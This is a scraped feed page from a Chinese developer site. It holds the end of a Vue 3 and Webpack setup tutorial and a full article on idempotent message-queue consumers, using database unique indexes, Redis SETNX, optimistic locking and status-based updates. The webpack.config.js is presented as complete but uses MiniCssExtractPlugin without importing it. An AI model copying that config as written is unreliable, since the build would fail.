<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
  <span class="hljs-keyword">import</span> { reactive } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
  <span class="hljs-keyword">const</span> state = <span class="hljs-title function_">reactive</span>({
    <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>
  });
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">onClick</span> = (<span class="hljs-params"/>) =&gt; {
    state.<span class="hljs-property">count</span> ++;
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.demo</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;
  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0px</span> <span class="hljs-number">0px</span> <span class="hljs-number">9px</span> <span class="hljs-number">#00000066</span>;
  <span class="hljs-attribute">text-align</span>: center;
}
<span class="hljs-selector-class">.demo</span> <span class="hljs-selector-class">.text</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">28px</span>;
  <span class="hljs-attribute">font-weight</span>: bolder;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#666666</span>;
}
<span class="hljs-selector-class">.demo</span> <span class="hljs-selector-class">.btn</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">10px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">32px</span>;
  <span class="hljs-attribute">min-width</span>: <span class="hljs-number">80px</span>;
  <span class="hljs-attribute">cursor</span>: pointer;
} 
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p>然后是入口文件 src/index.js，内容如下：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./app.vue'</span>;

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>);
app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>);
</code></pre>
<p>完成第一步后，<strong>进入第二步：安装项目所需的各种依赖包</strong>。</p>
<p>依赖包分为两类：一类是项目运行时必需的（runtime dependencies），另一类是开发时使用的工具（dev dependencies）。安装时需要用不同的命令参数加以区分。</p>
<p>首先安装运行时依赖（即项目实际需要的库）：</p>
<pre><code class="hljs language-shell" lang="shell">npm i --save vue
</code></pre>
<p>这条命令会把 Vue.js 添加到 package.json 的 dependencies 部分，表示这是项目运行所必需的库。</p>
<pre><code class="hljs language-javascript" lang="javascript">{
  <span class="hljs-string">"dependencies"</span>: {
    <span class="hljs-string">"vue"</span>: <span class="hljs-string">"^3.2.37"</span>
  }
}
</code></pre>
<p>接下来安装开发时所需的工具包：</p>
<pre><code class="hljs language-shell" lang="shell">npm i --save-dev css-loader mini-css-extract-plugin vue-loader webpack webpack-cli
</code></pre>
<p>这些工具仅在开发和构建阶段使用，不会出现在最终产品中。它们会被添加到 package.json 的 devDependencies 部分。</p>
<pre><code class="hljs language-javascript" lang="javascript">{
  <span class="hljs-string">"devDependencies"</span>: {
    <span class="hljs-string">"css-loader"</span>: <span class="hljs-string">"^6.7.1"</span>,
    <span class="hljs-string">"mini-css-extract-plugin"</span>: <span class="hljs-string">"^2.6.1"</span>,
    <span class="hljs-string">"vue-loader"</span>: <span class="hljs-string">"^17.0.0"</span>,
    <span class="hljs-string">"webpack"</span>: <span class="hljs-string">"^5.74.0"</span>,
    <span class="hljs-string">"webpack-cli"</span>: <span class="hljs-string">"^4.10.0"</span>
  }
}
</code></pre>
<p><strong>第三步：编写 Webpack 配置文件</strong></p>
<p>下面是完整的 webpack.config.js 配置代码，请先看一遍整体结构：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);
<span class="hljs-keyword">const</span> { <span class="hljs-title class_">VueLoaderPlugin</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'vue-loader'</span>);

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">entry</span>: <span class="hljs-string">'./src/index.js'</span>,
  <span class="hljs-attr">output</span>: {
    <span class="hljs-attr">path</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'dist'</span>),
    <span class="hljs-attr">filename</span>: <span class="hljs-string">'bundle.js'</span>
  },
  <span class="hljs-attr">module</span>: {
    <span class="hljs-attr">rules</span>: [
      {
        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.vue$/</span>,
        <span class="hljs-attr">loader</span>: <span class="hljs-string">'vue-loader'</span>
      },
      {
        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.css$/</span>,
        <span class="hljs-attr">use</span>: [
          <span class="hljs-title class_">MiniCssExtractPlugin</span>.<span class="hljs-property">loader</span>,
          <span class="hljs-string">'css-loader'</span>
        ]
      }
    ]
  },
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">VueLoaderPlugin</span>(),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">MiniCssExtractPlugin</span>({
      <span class="hljs-attr">filename</span>: <span class="hljs-string">'style.css'</span>
    })
  ]
};
</code></pre>
<p>这份配置告诉 Webpack 如何处理我们的 Vue.js 3 代码，包括 JS、CSS 和 Vue 单文件组件，最终生成浏览器可以直接运行的文件。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MQ消息幂等性实战：MQ 负责“不丢”，你负责“不重” —— 基于新增与修改场景的深度拆解]]></title>    <link>https://juejin.cn/post/7594801581004374052</link>    <guid>https://juejin.cn/post/7594801581004374052</guid>    <pubDate>2026-01-14T08:41:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594801581004374052" data-draft-id="7594801581004324900" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MQ消息幂等性实战：MQ 负责“不丢”，你负责“不重” —— 基于新增与修改场景的深度拆解"/> <meta itemprop="keywords" content="消息队列"/> <meta itemprop="datePublished" content="2026-01-14T08:41:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="理性的沸羊羊"/> <meta itemprop="url" content="https://juejin.cn/user/2922918847448590"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MQ消息幂等性实战：MQ 负责“不丢”，你负责“不重” —— 基于新增与修改场景的深度拆解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2922918847448590/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    理性的沸羊羊
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T08:41:42.000Z" title="Wed Jan 14 2026 08:41:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b90f78ff8e274bf4be3fd8ed68b53314~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55CG5oCn55qE5rK4576K576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768984902&amp;x-signature=RlVMddGZIvqznbxqFQ2c%2FpyHVJA%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-0">1. 引言：打破幻觉</h2>
<p>在分布式系统的世界里，我们首先要接受一个残酷的现实：<strong>任何主流的消息中间件（RabbitMQ, Kafka, RocketMQ），都无法保证“Exactly Once”（恰好一次）的投递语义。</strong></p>
<p>它们承诺的是 <strong>“At Least Once”（至少一次）</strong> 。为了保证消息绝不丢失（No Loss），MQ 会在网络抖动、Consumer 响应超时、甚至服务重启时，选择“宁可错杀一千（重复投递），不可放过一个（丢失消息）”。</p>
<p><strong>所以，重复消费不是 Bug，而是分布式系统为了高可靠性必须付出的代价。</strong></p>
<p>如果不处理幂等，后果是灾难性的：</p>
<ul>
<li>用户点了一次下单，系统生成了两笔订单。</li>
<li>用户支付了一次，账户余额被扣了两次。</li>
<li>库存明明只发了一次货，系统扣减了两次库存。</li>
</ul>
<p>今天，我们不谈那些虚无缥缈的理论，我将带你从 <strong>“数据操作类型”</strong> 这个独特的视角，将幂等性问题拆解为 <strong>Insert（新增）</strong> 和 <strong>Update（修改）</strong> 两个战场，逐个击破。</p>
<hr/>
<h2 data-id="heading-1">2. 核心战略：分而治之</h2>
<p>很多开发者的误区在于：试图用一个通用的 <code>Redis setnx</code> 或者是“去重表”解决所有问题。</p>
<p><strong>这是错误的。</strong></p>
<ul>
<li><strong>新增类业务（Insert）</strong> ：关注的是 <strong>“存在性”</strong> 。只要这个 ID 存在了，就坚决不能再生成第二条。</li>
<li><strong>修改类业务（Update）</strong> ：关注的是 <strong>“状态流转”</strong> 或 <strong>“版本控制”</strong> 。允许你执行 SQL，但前提是条件必须满足。</li>
</ul>
<p>针对这两类场景，我们的防御工事完全不同。</p>
<hr/>
<h2 data-id="heading-2">3. 场景一：新增类业务 (Insert) —— 守住底线</h2>
<p><strong>典型场景</strong>：用户注册（不能有两个同名用户）、创建订单（MQ 收到下单消息，不能插入两条订单记录）。 <strong>核心目标</strong>：数据库里绝对不能出现两条一样的记录。</p>
<h3 data-id="heading-3">方案 A（黄金标准）：数据库唯一索引 (Unique Index)</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f04805cdca14ab393037c39bec11216~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55CG5oCn55qE5rK4576K576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768984902&amp;x-signature=uGkGqDmpMLF4jd4gb6OhL%2BAox%2B0%3D" alt="image.png" loading="lazy"/></p>
<p>这是最底层、最硬核、也是最可靠的方案。不管你的代码写得多么花哨，Redis 挂没挂，数据库的唯一索引是最后的防线。</p>
<p><strong>1. 数据库层面 (MySQL DDL)</strong></p>
<p>你需要确保你的业务表中，有一个字段是“全局唯一”的（通常是业务主键，如 <code>order_no</code>，注意不是自增 <code>id</code>）。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `t_order` (
  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,
  `order_no` <span class="hljs-type">varchar</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'业务订单号，幂等核心'</span>,
  `user_id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  `amount` <span class="hljs-type">decimal</span>(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  `create_time` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,
  <span class="hljs-keyword">PRIMARY</span> KEY (`id`),
  <span class="hljs-comment">-- 关键点：建立唯一索引</span>
  <span class="hljs-keyword">UNIQUE</span> KEY `uk_order_no` (`order_no`)
) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4 COMMENT<span class="hljs-operator">=</span><span class="hljs-string">'订单表'</span>;
</code></pre>
<p><strong>2. 代码层面 (Java + Spring Boot)</strong></p>
<p>在消费者（Consumer）代码中，我们利用 <code>try-catch</code> 捕获数据库抛出的唯一索引冲突异常。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.dao.DuplicateKeyException;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;
​
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderConsumerService</span> {
​
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderMapper orderMapper;
​
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">(OrderMessageDTO message)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">entity</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>();
        entity.setOrderNo(message.getOrderNo()); <span class="hljs-comment">// 这里的 OrderNo 来自上游，且唯一</span>
        entity.setUserId(message.getUserId());
        entity.setAmount(message.getAmount());
​
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 尝试插入</span>
            orderMapper.insert(entity);
            System.out.println(<span class="hljs-string">"订单创建成功: "</span> + message.getOrderNo());
        } <span class="hljs-keyword">catch</span> (DuplicateKeyException e) {
            <span class="hljs-comment">// 捕获唯一索引冲突异常</span>
            <span class="hljs-comment">// 这说明是重复消息，直接吞掉异常，视为消费成功</span>
            System.out.println(<span class="hljs-string">"检测到重复订单消息，自动忽略: "</span> + message.getOrderNo());
        }
    }
}
</code></pre>
<h3 data-id="heading-4">方案 B（高性能）：Redis 防重 (SetNX)</h3>
<p>如果你的系统是秒杀级别，或者数据库压力已经很大，不想让每一次重复请求都去撞数据库（撞库会产生数据库行锁，影响性能），那么可以在 DB 之前加一层 Redis 过滤。</p>
<p><strong>核心代码 (StringRedisTemplate)</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;
<span class="hljs-keyword">import</span> java.time.Duration;
​
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisIdempotentToken</span> {
​
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> StringRedisTemplate redisTemplate;
​
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">lock</span><span class="hljs-params">(String bizId)</span> {
        <span class="hljs-comment">// key = 业务前缀 + 业务ID</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-string">"idempotent:order:"</span> + bizId;
        
        <span class="hljs-comment">// setIfAbsent 等同于 SETNX</span>
        <span class="hljs-comment">// 关键点：必须设置过期时间！防止服务挂掉后 Key 永久存在，导致该订单永远无法处理</span>
        <span class="hljs-type">Boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue()
                .setIfAbsent(key, <span class="hljs-string">"1"</span>, Duration.ofMinutes(<span class="hljs-number">10</span>));
        
        <span class="hljs-keyword">return</span> Boolean.TRUE.equals(success);
    }
}
​
<span class="hljs-comment">// 消费者伪代码</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleMessage</span><span class="hljs-params">(OrderMessageDTO msg)</span> {
    <span class="hljs-comment">// 1. 先过 Redis 这一关</span>
    <span class="hljs-type">boolean</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> redisIdempotentToken.lock(msg.getOrderNo());
    <span class="hljs-keyword">if</span> (!lock) {
        log.info(<span class="hljs-string">"重复消息被 Redis 拦截: {}"</span>, msg.getOrderNo());
        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 直接 ACK</span>
    }
    
    <span class="hljs-comment">// 2. 再执行数据库操作（数据库最好依然保留唯一索引兜底）</span>
    <span class="hljs-keyword">try</span> {
        orderService.createOrder(msg);
    } <span class="hljs-keyword">catch</span> (Exception e) {
        <span class="hljs-comment">// 如果业务失败，理论上应该删除 Redis key 允许重试</span>
        <span class="hljs-comment">// 但如果这里挂了，Key 会在 10 分钟后自动过期，实现最终一致性</span>
        <span class="hljs-keyword">throw</span> e;
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-5">4. 场景二：修改类业务 (Update) —— 巧妙利用数据状态</h2>
<p><strong>典型场景</strong>：订单支付成功后，将状态从 <code>UNPAID</code> 改为 <code>PAID</code>；或者扣减库存。 <strong>核心目标</strong>：防止 ABA 问题，或防止重复扣减。</p>
<h3 data-id="heading-6">方案 A（最推荐）：多版本控制/乐观锁 (Optimistic Locking)</h3>
<p>对于库存扣减、余额变更这类涉及“计算”的更新，<strong>乐观锁</strong>是最佳实践。我们给表加一个 <code>version</code> 字段。</p>
<p><strong>1. SQL 原理</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 假设当前库存是 100，版本号是 5</span>
<span class="hljs-comment">-- 只有当版本号还是 5 的时候，才执行扣减，同时版本号 +1</span>
<span class="hljs-keyword">UPDATE</span> t_product_stock 
<span class="hljs-keyword">SET</span> stock <span class="hljs-operator">=</span> stock <span class="hljs-operator">-</span> <span class="hljs-number">1</span>, version <span class="hljs-operator">=</span> version <span class="hljs-operator">+</span> <span class="hljs-number">1</span> 
<span class="hljs-keyword">WHERE</span> product_id <span class="hljs-operator">=</span> <span class="hljs-number">1001</span> <span class="hljs-keyword">AND</span> version <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;
</code></pre>
<p><strong>2. Java DAO 层代码 (MyBatis)</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Mapper</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">StockMapper</span> {
​
    <span class="hljs-comment">/**
     * 乐观锁扣减库存
     * <span class="hljs-doctag">@return</span> 影响行数。1 表示成功，0 表示版本不匹配（已被别人修改或重复请求）
     */</span>
    <span class="hljs-meta">@Update("UPDATE t_product_stock SET stock = stock - #{count}, version = version + 1 " +
            "WHERE product_id = #{productId} AND version = #{oldVersion}")</span>
    <span class="hljs-type">int</span> <span class="hljs-title function_">deductStock</span><span class="hljs-params">(<span class="hljs-meta">@Param("productId")</span> Long productId, 
                    <span class="hljs-meta">@Param("count")</span> Integer count, 
                    <span class="hljs-meta">@Param("oldVersion")</span> Integer oldVersion)</span>;
}
</code></pre>
<p><strong>消费者逻辑：</strong> 消费者先查出当前数据的 version，然后尝试更新。如果返回 <code>0</code>，说明数据变了，此时通常需要重新查询再重试（CAS 自旋），或者根据业务逻辑直接判断为“已处理”。</p>
<h3 data-id="heading-7">方案 B（业务逻辑锁）：状态机 (State Machine)</h3>
<p>对于订单状态流转，我们不需要额外的 <code>version</code> 字段，<strong>状态本身就是锁</strong>。</p>
<p><strong>1. SQL 原理</strong></p>
<p>业务规则：订单只能从 <code>UNPAID</code> (待支付) 变为 <code>PAID</code> (已支付)。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">UPDATE</span> t_order 
<span class="hljs-keyword">SET</span> status <span class="hljs-operator">=</span> <span class="hljs-string">'PAID'</span>, update_time <span class="hljs-operator">=</span> NOW()
<span class="hljs-keyword">WHERE</span> order_no <span class="hljs-operator">=</span> <span class="hljs-string">'ORDER_20240101'</span> <span class="hljs-keyword">AND</span> status <span class="hljs-operator">=</span> <span class="hljs-string">'UNPAID'</span>;
</code></pre>
<p><strong>2. Java 代码</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">payOrder</span><span class="hljs-params">(String orderNo)</span> {
    <span class="hljs-comment">// 利用 update 的原子性和 where 条件</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">rows</span> <span class="hljs-operator">=</span> orderMapper.updateStatus(orderNo, <span class="hljs-string">"PAID"</span>, <span class="hljs-string">"UNPAID"</span>);
    
    <span class="hljs-keyword">if</span> (rows == <span class="hljs-number">1</span>) {
        System.out.println(<span class="hljs-string">"订单支付成功，状态更新完成"</span>);
        <span class="hljs-comment">// 后续发货逻辑...</span>
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// rows == 0，意味着：</span>
        <span class="hljs-comment">// 1. 订单不存在（极少）</span>
        <span class="hljs-comment">// 2. 订单状态已经不是 UNPAID 了（可能是 PAID，也可能是 CLOSED）</span>
        <span class="hljs-comment">// 结论：消息是重复的，或者乱序的，直接忽略，视为幂等成功</span>
        System.out.println(<span class="hljs-string">"订单状态不符合或已处理，忽略消息: "</span> + orderNo);
    }
}
</code></pre>
<p>这种方案极其简洁，不需要引入复杂的分布式锁，利用数据库行锁天然解决并发和幂等。</p>
<hr/>
<h2 data-id="heading-8">5. 避坑指南与总结</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7125e9dd6eec415b8643efc20eb81219~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55CG5oCn55qE5rK4576K576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768984902&amp;x-signature=dmt5xteEAx2hYoEsxdMFPR2UpY8%3D" alt="image.png" loading="lazy"/>
在文章的最后，我要提醒大家一个在“Redis + 数据库”混合双打时最容易踩的坑。</p>
<h3 data-id="heading-9">⚠️ 致命坑：Redis 原子性陷阱</h3>
<p><strong>错误流程：</strong></p>
<ol start="0">
<li>消费者收到消息。</li>
<li><code>Redis.setnx</code> 成功。</li>
<li>开始执行 DB 事务。</li>
<li><strong>DB 事务报错/超时/回滚</strong>。</li>
<li>消费者结束，Redis 里的 Key 依然存在。</li>
</ol>
<p><strong>后果：</strong> MQ 会重试这条消息。但第二次进来时，Redis 判断 Key 已存在，认为是重复请求，直接拦截返回成功。 <strong>最终结果：</strong> 数据库里没数据，消息却被丢弃了！<strong>数据丢失！</strong></p>
<p><strong>解决方案：</strong></p>
<ol start="0">
<li><strong>数据库兜底</strong>：Redis 只是为了挡住 99% 的流量，数据库必须依然有唯一索引。</li>
<li><strong>异常删除</strong>：在 catch 代码块中，务必显式删除 Redis Key。</li>
<li><strong>短 TTL</strong>：给 Redis Key 设置合理的过期时间（如 10 分钟），作为最后的容错手段。</li>
</ol>
<h3 data-id="heading-10">📝 终极对比表</h3>








































<table><thead><tr><th>维度</th><th>新增场景 (Insert)</th><th>修改场景 (Update)</th></tr></thead><tbody><tr><td><strong>典型业务</strong></td><td>创建订单、注册用户、新增流水</td><td>扣减库存、更新订单状态、修改余额</td></tr><tr><td><strong>推荐方案</strong></td><td><strong>数据库唯一索引 (Unique Index)</strong></td><td><strong>状态机 (Where Status) / 乐观锁</strong></td></tr><tr><td><strong>备选方案</strong></td><td>Redis SetNX (用于超高并发前置拦截)</td><td>去重表 (适用于跨多表复杂逻辑)</td></tr><tr><td><strong>核心逻辑</strong></td><td>靠“键冲突”来保证</td><td>靠“条件不满足”来保证</td></tr><tr><td><strong>优点</strong></td><td>强一致性，代码简单，不易出错</td><td>性能好，无额外存储开销</td></tr><tr><td><strong>缺点</strong></td><td>数据库写压力大时需配合 Redis</td><td>需要业务有明确的状态流转或版本号</td></tr></tbody></table>
